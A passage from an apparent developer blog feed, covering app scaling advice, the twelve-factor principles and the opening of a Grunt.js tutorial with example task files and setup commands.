<img src="/images/1m_users.png" title="Microservices Setup">
<p>If you notice, we have three new components that can scale independently as needed: Users, Products Catalog, and Orders for instance. Another advantages of having microservices is that we can have split the database as well.</p>
<h1 id="Automate-Chores-1-000-000-concurrent-users">Automate Chores (1,000,000+ concurrent users)<a href="#Automate-Chores-1-000-000-concurrent-users" class="headerlink" title="Automate Chores (1,000,000+ concurrent users)"></a></h1><p>OMG! That‚Äôs so many people, get you champagne bottle out and celebrate üéâafter you automate!</p>
<p><strong>Automate</strong> as much as you can. The infrastructure is getting fat. We have db replicas and sharding, horizontal scaling, multiple regions and multi-AZ, autoscaling.</p>
<p><strong>Highly Available, Multi-Region</strong> At this point, to scale we just keep adding instances and spreading across availability zones and regions based on the source of the traffic. If you notice that a significant amount of traffic is coming from Australia and Germany maybe it‚Äôs the time to make your app available there (e.g. ap-southeast-2, eu-central-1). Bear in mind that regions doesn‚Äôt provide low latency links between them. One way to work around this issue is sharding the database.</p>
<p><strong>Autoscaling</strong> It would be a waste if you always allocate servers for peak capacity. User traffic has peaks (e.g. Black Friday) and valleys (e.g. 4 am.). That said, it‚Äôs better to put in place an autoscaling option that allows the network to adjust to the traffic conditions. There are multiple strategies to autoscale such as CPU utilization, scale based on latency or based on network traffic.</p>
<p><strong>Metrics</strong> You will also need metrics, monitoring and centralize logging. Measure everything that can be measured. Server nodes might start to fail randomly, and you don‚Äôt want to login/SSH into each one to determine the cause. You can avoid that by having a centralized logging solution such as the ELK stack (Elasticsearch, Logstash, and Kibana). For monitoring, you can try DataDog, it has very nice visualization about the servers and CPU/RAM stats. Actully, in DataDog you can aggregate any data that you want.</p>
<p><strong>Customization</strong> Databases might still be a headache to scale. If you identify that your use case it‚Äôs better solved with a different NoSQL solution, go for it. Try always to not reinvent the wheel, but if there‚Äôs no solution out there for your particular need, consider doing your own.</p>
<p>For more general guidelines <a href="/blog/2016/01/09/how-to-build-scalable-apps/">read my previous post</a>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Massive success is the best that could happen to any application. But, it could be a blessing and a curse for developers. Dealing with downtime, high availability and trying to scale. The following is a guideline on how to scale the web applications as the number of users grows.&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
    
      <category term="production" scheme="https://adrianmejia.com/tags/production/"/>
    
      <category term="scalability" scheme="https://adrianmejia.com/tags/scalability/"/>
    
  </entry>
  
  <entry>
    <title>How to build scalable apps?</title>
    <link href="https://adrianmejia.com/blog/2016/01/09/how-to-build-scalable-apps/"/>
    <id>https://adrianmejia.com/blog/2016/01/09/how-to-build-scalable-apps/</id>
    <published>2016-01-09T15:43:27.000Z</published>
    <updated>2016-01-09T15:43:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>Scaling application is not an easy topic to cover in one post. So in this first post, you can find ‚Äúthe mindset‚Äù to build scalable apps using the 12-factor principles. In the <a href="/blog/2016/03/23/how-to-scale-a-nodejs-app-based-on-number-of-users/">next post</a>, you will find more down to earth examples one how to scale based on the number of users.</p>
<p>The Twelve steps are a compilation of guidelines to ensure apps can scale up without significant changes and tooling. These are very suitable for cloud platforms and continuous deployment. Furthermore, these principles are language agnostic, so it will work with any framework.</p>
<a id="more"></a>
<p><strong>The Twelve Factor Principles</strong></p>
<h1 id="One-codebase-per-app-multiple-deployments">One codebase per app, multiple deployments<a href="#One-codebase-per-app-multiple-deployments" class="headerlink" title="One codebase per app, multiple deployments"></a></h1><p><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> <em>DO</em></p>
<ul>
<li>One codebase to rule all deployment environments: production, staging, local and so on and differentiate them from config files (see #3).</li>
</ul>
<p><i class="fa fa-thumbs-o-down" aria-hidden="true"></i> <em>DON‚ÄôT</em></p>
<ul>
<li>Multiple apps sharing the same code. INSTEAD the common code should be extracted from a library and included through a dependency manager.</li>
</ul>
<h1 id="Declare-and-isolate-dependencies">Declare and isolate dependencies<a href="#Declare-and-isolate-dependencies" class="headerlink" title="Declare and isolate dependencies"></a></h1><p><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> <em>DO</em></p>
<ul>
<li>Have a dependency declaration manifest (e.g. packages.json, Gemfile)</li>
<li>Execute dependencies in isolation per app (e.g. bundle exec).</li>
</ul>
<p><i class="fa fa-thumbs-o-down" aria-hidden="true"></i> <em>DON‚ÄôT</em></p>
<ul>
<li>Rely on implicit existence of system-wide packages (e.g. curl, ImageMagik). INSTEAD vendor them into the app.</li>
</ul>
<h1 id="Store-the-config-in-the-environment">Store the config in the environment<a href="#Store-the-config-in-the-environment" class="headerlink" title="Store the config in the environment"></a></h1><p><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> <em>DO</em></p>
<ul>
<li>Separate app‚Äôs config (AWS S3, passwords, Google/Fb/Tw/APIs credentials, deployment hostname) from the code.</li>
<li>Keep the code ready in a way that if were open source, it wouldn‚Äôt compromise any credentials.</li>
<li>Use/commit ‚Äòconfig‚Äô files with sensitive information into repository. INSTEAD use environmental variables (env, env vars) which are easily changed between deployments and without changing code.</li>
</ul>
<p><i class="fa fa-thumbs-o-down" aria-hidden="true"></i> <em>DON‚ÄôT</em></p>
<ul>
<li>Group config variables by environment (e.g. AWS_S3_PRODUCTION, AWS_S3_TEST, AWS_S3_QA, AWS_S3_STAGING, AWS_S3_JOE‚Ä¶). INSTEAD use clean environment variables (e.g. AWS_S3) that are managed individually per deploy.</li>
</ul>
<h1 id="Swappable-local-and-third-party-services">Swappable local and third party services<a href="#Swappable-local-and-third-party-services" class="headerlink" title="Swappable local and third party services"></a></h1><p><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> <em>DO</em></p>
<ul>
<li>Services like databases (e.g. MongoDB, PostgreSQL), message queues (e.g. RabbitMQ, Beanstalkd) should be accessed via URL or locator/credential stored in config.</li>
<li>Swapping local to production services should be done without any code changes.</li>
</ul>
<h1 id="Build-and-runtime">Build and runtime<a href="#Build-and-runtime" class="headerlink" title="Build and runtime"></a></h1><p><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> <em>DO</em></p>
<ul>
<li>Code changes flows in one direction only development -&gt; build -&gt; run time environments.</li>
</ul>
<h1 id="Execute-the-app-as-share-nothing-stateless-processes">Execute the app as share-nothing stateless processes<a href="#Execute-the-app-as-share-nothing-stateless-processes" class="headerlink" title="Execute the app as share-nothing stateless processes"></a></h1><p><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> <em>DO</em></p>
<ul>
<li>Store any persistent data in external services (such as databases)</li>
</ul>
<p><i class="fa fa-thumbs-o-down" aria-hidden="true"></i> <em>DON‚ÄôT</em></p>
<ul>
<li>Use the filesystem/memory to save states. INSTEAD any instance of the app should be able to handle requests.</li>
</ul>
<h1 id="Export-services-via-port-binding">Export services via port binding<a href="#Export-services-via-port-binding" class="headerlink" title="Export services via port binding"></a></h1><p><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> <em>DO</em></p>
<ul>
<li>App is completely self-contained and communicates with other processes through port binding.</li>
</ul>
<h1 id="Scale-out-the-app-horizontally">Scale out the app horizontally<a href="#Scale-out-the-app-horizontally" class="headerlink" title="Scale out the app horizontally"></a></h1><p><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> <em>DO</em></p>
<ul>
<li>Scale app horizontally since the app is a stateless and share-nothing model.</li>
</ul>
<p><i class="fa fa-thumbs-o-down" aria-hidden="true"></i> <em>DON‚ÄôT</em></p>
<ul>
<li>Daemonize. INSTEAD use operating system manager such as Upstart or init and Foreman in development.</li>
</ul>
<h1 id="Fast-startup-and-shutdown">Fast startup and shutdown<a href="#Fast-startup-and-shutdown" class="headerlink" title="Fast startup and shutdown"></a></h1><p><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> <em>DO</em></p>
<ul>
<li>app start in few seconds to serve requests or jobs.</li>
<li>shut down gracefully after receiving SIGTERM signal  (stop receiving new request/jobs, finish processing current request/job before stopping).</li>
</ul>
<h1 id="Keep-development-staging-and-production-as-similar-as-possible">Keep development, staging, and production as similar as possible<a href="#Keep-development-staging-and-production-as-similar-as-possible" class="headerlink" title="Keep development, staging, and production as similar as possible"></a></h1><p><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> <em>DO</em></p>
<ul>
<li>design app for continuous deployment keeping the tools gaps and deployment times as minimum as possible.</li>
<li>code from development to production should take few hours or just few minutes.</li>
<li>developers who wrote the code should be able to deploy it to production.</li>
<li>keep production and development tool the same as possible</li>
</ul>
<p><i class="fa fa-thumbs-o-down" aria-hidden="true"></i> <em>DON‚ÄôT</em></p>
<ul>
<li>use different services on production and development (e.g. development using SQLite and production ProtgreSQL).</li>
</ul>
<h1 id="Logs-goes-to-stdout">Logs goes to stdout<a href="#Logs-goes-to-stdout" class="headerlink" title="Logs goes to stdout"></a></h1><p><i class="fa fa-thumbs-o-down" aria-hidden="true"></i> <em>DON‚ÄôT</em></p>
<ul>
<li>write logs to a particular location in the filesystem. INSTEAD send them to STDOUT, so they can be routed as will depending the environment (e.g. output to terminal in development and output to log file in production)</li>
</ul>
<h1 id="Admin-processes">Admin processes<a href="#Admin-processes" class="headerlink" title="Admin processes"></a></h1><p><i class="fa fa-thumbs-o-up" aria-hidden="true"></i> <em>DO</em></p>
<ul>
<li>favor languages/frameworks that use REPL shell out of the box to do admin tasks such as migrating databases, running consoles or running one-time scripts.</li>
</ul>
<p>This is just the beginning follow up with <a href="/blog/2016/03/23/how-to-scale-a-nodejs-app-based-on-number-of-users/">this next post</a>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Scaling application is not an easy topic to cover in one post. So in this first post, you can find ‚Äúthe mindset‚Äù to build scalable apps using the 12-factor principles. In the &lt;a href=&quot;/blog/2016/03/23/how-to-scale-a-nodejs-app-based-on-number-of-users/&quot;&gt;next post&lt;/a&gt;, you will find more down to earth examples one how to scale based on the number of users.&lt;/p&gt;
&lt;p&gt;The Twelve steps are a compilation of guidelines to ensure apps can scale up without significant changes and tooling. These are very suitable for cloud platforms and continuous deployment. Furthermore, these principles are language agnostic, so it will work with any framework.&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
    
      <category term="production" scheme="https://adrianmejia.com/tags/production/"/>
    
      <category term="scalability" scheme="https://adrianmejia.com/tags/scalability/"/>
    
  </entry>
  
  <entry>
    <title>Grunt JS tutorial from Beginner to Ninja</title>
    <link href="https://adrianmejia.com/blog/2014/10/07/grunt-js-tutorial-from-beginner-to-ninja/"/>
    <id>https://adrianmejia.com/blog/2014/10/07/grunt-js-tutorial-from-beginner-to-ninja/</id>
    <published>2014-10-07T14:41:13.000Z</published>
    <updated>2014-10-07T14:41:13.000Z</updated>
    
    <content type="html"><![CDATA[<p>Sometimes you find yourself doing the same tasks again and again, especially during web development. It is time to automate repetitive tasks and use that time in more creative activities. This is where Grunt comes in. Grunt is a popular task runner that runs on NodeJS. It can minify CSS/JavaScript, run linting tools (JSHint, JSlint, CSSlint), deploy to server, and run test cases when you change a file to name a few. All the information I found about Grunt and similar Javascript test runners were too verbose and not very helpful to get started quickly. So, I decided to make this tutorial.</p>
<a id="more"></a>
<h1 id="Beginner-Grunt-js-101">Beginner: Grunt.js 101<a href="#Beginner-Grunt-js-101" class="headerlink" title="Beginner: Grunt.js 101"></a></h1><p>Grunt.js is a Javascript task runner. At its bare core it does file manipulation (mkdir, reads, write, copy), print messages and helper methods to organize and configure multiple tasks. It takes care of differences among Operating Systems for you. However, the real power comes in with the number of available plugins ready to use. Usually named <code>grunt-contrib-*</code>. Let‚Äôs start from scratch!</p>
<h1 id="Hello-Wold-from-GruntJS">Hello Wold from GruntJS<a href="#Hello-Wold-from-GruntJS" class="headerlink" title="Hello Wold from GruntJS"></a></h1><p>You need to <a href="/blog/2014/10/01/creating-a-restful-api-tutorial-with-nodejs-and-mongodb/#nodejs">install Node.js and NPM</a> to follow along with this example.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir grunt101 &amp;&amp; <span class="built_in">cd</span> grunt101</span><br><span class="line"></span><br><span class="line"><span class="comment"># start Node.js project and answer the questions (or leave it in blank)</span></span><br><span class="line">npm init</span><br><span class="line"></span><br><span class="line"><span class="comment"># add Grunt as a dependency</span></span><br><span class="line">npm install grunt  --save-dev</span><br></pre></td></tr></table></figure>
<p>If you run the grunt command you will get a message like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grunt</span><br><span class="line"><span class="comment"># A valid Gruntfile could not be found. Please see the getting started guide for more information on how to configure grunt: http://gruntjs.com/getting-started</span></span><br><span class="line"><span class="comment"># Fatal error: Unable to find Gruntfile.</span></span><br></pre></td></tr></table></figure>
<p>So, let‚Äôs create the <code>Gruntfile.js</code> file:</p>
<figure class="highlight javascript"><figcaption><span>Gruntfile.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> grunt = <span class="built_in">require</span>(<span class="string">'grunt'</span>);</span><br><span class="line"></span><br><span class="line">grunt.registerTask(<span class="string">'default'</span>, <span class="string">'default task description'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello world'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>If you run <code>grunt</code> again, you will see a message. The default task is run when nothing else it is specified. We are going to create a 2nd task called ‚Äòhello‚Äô and it is going to accept a parameter that we can pass along with the task name separated with a colon. As follows: <code>grunt hello:adrian</code>. We can handle errors using <code>grunt.warn</code>. Every time a <code>grunt.warn</code> is found the task will stop executing, and it will give its warning message.. You can override using <code>--force</code>. Try all this commands and noticed the different effects: <code>grunt</code>, <code>grunt hello</code>, <code>grunt hello --force</code>, <code>grunt hello:adrian</code>.</p>
<figure class="highlight javascript"><figcaption><span>Gruntfile.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> grunt = <span class="built_in">require</span>(<span class="string">'grunt'</span>);</span><br><span class="line"></span><br><span class="line">grunt.registerTask(<span class="string">'default'</span>, <span class="string">'default task description'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello world'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">grunt.registerTask(<span class="string">'hello'</span>, <span class="string">'say hello'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!name || !name.length)</span><br><span class="line">    grunt.warn(<span class="string">'you need to provide a name.'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello '</span> + name);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>We can chain multiple grunt tasks by using and array. Change the <code>Gruntfile.js</code> for the following and see what will happen when you type <code>grunt</code>.</p>
<figure class="highlight javascript"><figcaption><span>Gruntfile.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> grunt = <span class="built_in">require</span>(<span class="string">'grunt'</span>);</span><br><span class="line"></span><br><span class="line">grunt.registerTask(<span class="string">'world'</span>, <span class="string">'world task description'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello world'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">grunt.registerTask(<span class="string">'hello'</span>, <span class="string">'say hello'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!name || !name.length)</span><br><span class="line">    grunt.warn(<span class="string">'you need to provide a name.'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'hello '</span> + name);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">grunt.registerTask(<span class="string">'default'</span>, [<span class="string">'world'</span>, <span class="string">'hello:adrian'</span>]);</span><br></pre></td></tr></table></figure>
<h1 id="Reference-1-Grunt-tasks-config-and-warnings">Reference 1: Grunt tasks, config and warnings<a href="#Reference-1-Grunt-tasks-config-and-warnings" class="headerlink" title="Reference 1: Grunt tasks, config and warnings"></a></h1><p>Here are some of the methods that we have used so far and some more that we will use in the next examples:</p>
<h2 id="Grunt-config">Grunt config<a href="#Grunt-config" class="headerlink" title="Grunt config"></a></h2><ul>
<li><p><a href="http://gruntjs.com/api/grunt.config#grunt.config.init" target="_blank" rel="noopener">grunt.initConfig(configObject)</a>: Initialize a configuration object. It can be accessed by <code>grunt.config.get</code>.</p>
</li>
<li><p><a href="http://gruntjs.com/api/grunt.config#grunt.config.get" target="_blank" rel="noopener">grunt.config.get([prop])</a>:  get the prop value from the <code>grunt.initConfig</code>. The property could be deeply nested (e.g. <code>concat.options.dest</code>) and the values inside <code>&lt;% %&gt;</code> are expanded.</p>
</li>
</ul>
<h2 id="Grunt-tasks">Grunt tasks<a href="#Grunt-tasks" class="headerlink" title="Grunt tasks"></a></h2><ul>
<li><a href="http://gruntjs.com/api/grunt.task#grunt.task.registertask" target="_blank" rel="noopener">grunt.registerTask(taskName[, description], taskFunction)</a>: register a task.<ul>
<li><strong>taskName</strong>: required to register the task and it allows the task to be e executed with <code>grunt taskName</code> or called by other grunt task.</li>
<li><strong>description</strong>: (optional) string describing task.</li>
<li><strong>taskFunction</strong>: function which can accept parameters separated by colons (:). E.g. <code>grunt taskName:arg1:arg2</code></li>
</ul>
</li>
</ul>
<ul>
<li><a href="http://gruntjs.com/api/grunt.task#grunt.task.registertask" target="_blank" rel="noopener">grunt.task.registerTask(taskName, taskList)</a>: register task.<ul>
<li><strong>taskName</strong>: required to register the task and it allows the task to be e executed with <code>grunt taskName</code> or called by other grunt task.</li>
<li><strong>taskList</strong>: array of taskNames to be executed, in the order specified, when the taskName is called. E.g.: <code>grunt.registerTask(&#39;concatAll&#39;, [&#39;concat:templates&#39;, &#39;concat:javascripts&#39;, &#39;concat:stylesheets&#39;]);</code></li>
</ul>
</li>
</ul>
<ul>
<li><a href="http://gruntjs.com/api/grunt.task#grunt.task.registermultitask" target="_blank" rel="noopener">grunt.registerMultiTask(taskName[, description], taskFunction)</a>: multi-tasks accepts the same parameters as <code>grunt.registerTask</code>. However, it reads <code>grunt.initConfig</code> parameters differently:<ol>
<li>Grunt looks for a config that matches the taskName.</li>
<li>MultiTask can have multiple configurations referred as <code>this.target</code> and the value as <code>this.data</code>.</li>
<li>All the ‚Äútargets‚Äù are run if it is not specified otherwise.</li>
</ol>
</li>
</ul>
<figure class="highlight javascript"><figcaption><span>registerMultiTask Example</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grunt.initConfig(&#123;</span><br><span class="line">  print: &#123;</span><br><span class="line">    target1: [<span class="string">'index.html'</span>, <span class="string">'src/styles.css'</span>, <span class="number">2</span>],</span><br><span class="line">    target2: <span class="string">'data'</span>,</span><br><span class="line">    hello: <span class="string">'world'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">grunt.registerMultiTask(<span class="string">'print'</span>, <span class="string">'print targets'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  grunt.log.writeln(<span class="keyword">this</span>.target + <span class="string">': '</span> + <span class="keyword">this</span>.data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>You can specify one target <code>grunt print:hello</code> or run all them <code>grunt print</code> which will produce this output:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Running &quot;print:target1&quot; (print) task</span><br><span class="line">target1: index.html,src/styles.css,2</span><br><span class="line"></span><br><span class="line">Running &quot;print:target2&quot; (print) task</span><br><span class="line">target2: data</span><br><span class="line"></span><br><span class="line">Running &quot;print:hello&quot; (print) task</span><br><span class="line">hello: world</span><br></pre></td></tr></table></figure>
<h2 id="Grunt-Errors-and-Warnings">Grunt Errors and Warnings<a href="#Grunt-Errors-and-Warnings" class="headerlink" title="Grunt Errors and Warnings"></a></h2><ul>
<li><p><a href="http://gruntjs.com/api/grunt.fail#grunt.fail.warn" target="_blank" rel="noopener">grunt.fail.warn(error [, errorcode])</a>: prints to STDOUT a message and abort grunt executions. It can be override using <code>--force</code> and it can show the stack trace if <code>--stack</code> is given. e.g. <code>grunt taskName --force --stack</code>.</p>
</li>
<li><p><a href="http://gruntjs.com/api/grunt.fail#grunt.fail.fatal" target="_blank" rel="noopener">grunt.fail.fatal(error [, errorcode])</a>: similar to <code>warn</code>, displays message to STDOUT and terminate Grunt. Cannot be <code>--force</code>ed and it emits a beep unless <code>--no-color</code> parameter is passed. It also accepts <code>--stack</code>. E.g. <code>grunt taskName --no-color --stack</code>.</p>
</li>
</ul>
<h1 id="Example-Forex-and-grunt-multiple-async-calls-handling">Example: Forex and grunt multiple async calls handling<a href="#Example-Forex-and-grunt-multiple-async-calls-handling" class="headerlink" title="Example: Forex and grunt multiple async calls handling"></a></h1><p>The idea is get conversion rates from a base currency (e.g. USD) to a target currency (e.g. EUR). We are using a <code>registerMultiTask</code>, so the taskName ‚Äòcurrency‚Äô matches its property in the <code>config.init</code>. Notice that we can has additional arbitrary data such as endpoint URL.</p>
<p>Async calls can be a little tricky in Javascript. We are going to do multiple HTTP request. Since <code>http.get</code> is async Grunt will finish the task before even receiving any response. <code>this.async()</code> solves the issue, we just need to call it when we are done.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">grunt</span>)</span>&#123;</span><br><span class="line">  grunt.config.init(&#123;</span><br><span class="line">    currency: &#123;</span><br><span class="line">      USD: [<span class="string">'EUR'</span>, <span class="string">'GBP'</span>, <span class="string">'DOP'</span>],</span><br><span class="line">      DOP: [<span class="string">'USD'</span>]</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    endpoint: &#123;</span><br><span class="line">      host: <span class="string">'http://www.freecurrencyconverter3api.com'</span>,</span><br><span class="line">      path: <span class="string">'/api/v2/convert?compact=y&amp;q='</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  grunt.registerMultiTask(<span class="string">'currency'</span>, <span class="string">'Fetches currency exchange rates'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>),</span><br><span class="line">      done = <span class="keyword">this</span>.async(),</span><br><span class="line">      responses = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> baseCurrency = <span class="keyword">this</span>.target;</span><br><span class="line">    <span class="keyword">var</span> targetCurrencies = <span class="keyword">this</span>.data;</span><br><span class="line"></span><br><span class="line">    grunt.config.requires(<span class="string">'endpoint'</span>);</span><br><span class="line"></span><br><span class="line">    targetCurrencies.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">targetCurrency, i, arr</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> convertTo = baseCurrency + <span class="string">'_'</span> + targetCurrency,</span><br><span class="line">        body = [];</span><br><span class="line">        url = grunt.config.get(<span class="string">'endpoint.host'</span>);</span><br><span class="line"></span><br><span class="line">      url += grunt.config.get(<span class="string">'endpoint.path'</span>) + convertTo;</span><br><span class="line"></span><br><span class="line">      http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">        res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">          body.push(data);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        res.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">var</span> conversion = <span class="built_in">JSON</span>.parse(body.join());</span><br><span class="line">          grunt.log.ok(baseCurrency + <span class="string">'/'</span> + targetCurrency + <span class="string">' =&gt; '</span> + conversion[convertTo].val);</span><br><span class="line">          <span class="comment">// if got all responses: done!</span></span><br><span class="line">          <span class="keyword">if</span>(responses++ == arr.length - <span class="number">1</span>)</span><br><span class="line">            done();</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;).on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">        grunt.warn(<span class="string">'Please verify endpoint host and path: &lt;'</span>+ url +<span class="string">'&gt;. It might be incorrect or down.'</span>);</span><br><span class="line">        done(err);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Reference-2-Grunt-Files-and-logs">Reference 2: Grunt Files and logs<a href="#Reference-2-Grunt-Files-and-logs" class="headerlink" title="Reference 2: Grunt Files and logs"></a></h1><h2 id="Grunt-logs">Grunt logs<a href="#Grunt-logs" class="headerlink" title="Grunt logs"></a></h2><p>All them stars with the prefix <code>grunt.log</code> and accepts a <code>msg</code> which is displayed to STDOUT (usually the screen). Here are the differences between them:</p>
<ul>
<li><a href="http://gruntjs.com/api/grunt.log#grunt.log.writeln-grunt.verbose.writeln" target="_blank" rel="noopener">writeln([msg]), write(msg) and subhead(msg)</a>: writes message to STDOUT. <code>grunt.log.writeln</code> will do the same as <code>grunt.log.write</code> but without trailing newline. <code>subhead(msg)</code> will print the message in bold and proceeded by a newline and a trailing newline as well.</li>
</ul>
<p>The following methods adds a ‚Äú&gt;&gt;‚Äù before the message in the screen which could be of different colors depending on the method:</p>
<ul>
<li><code>grunt.log.error([msg])</code>: print message prefixed with a RED ‚Äú&gt;&gt;‚Äù.</li>
<li><code>grunt.log.ok([msg])</code>: print message prefixed with a GREEN ‚Äú&gt;&gt;‚Äù.</li>
</ul>
<h2 id="Grunt-files">Grunt files<a href="#Grunt-files" class="headerlink" title="Grunt files"></a></h2><p><strong>Files</strong></p>
<p>All has an optional attributes <code>options</code> that could be <code>encoding</code> among others.</p>
<ul>
<li><a href="http://gruntjs.com/api/grunt.file#grunt.file.write" target="_blank" rel="noopener">grunt.file.write(filepath, contents [, options])</a>: writes contents to file, creates path if necessary.</li>
<li><a href="http://gruntjs.com/api/grunt.file#grunt.file.read" target="_blank" rel="noopener">grunt.file.read(filepath [, options])</a>: returns file content.</li>
<li><a href="http://gruntjs.com/api/grunt.file#grunt.file.readjson" target="_blank" rel="noopener">grunt.file.readJSON(filepath [, options])</a>: reads file content and parse it to JSON.</li>
<li><a href="http://gruntjs.com/api/grunt.file#grunt.file.delete" target="_blank" rel="noopener">grunt.file.delete(filepath [, options])</a>: deletes files recursively.</li>
<li><a href="http://gruntjs.com/api/grunt.file#grunt.file.copy" target="_blank" rel="noopener">grunt.file.copy(srcpath, destpath [, options])</a>: copy file from <code>srcpath</code> to <code>destpath</code>.</li>
</ul>
<p><strong>Directories</strong></p>
<ul>
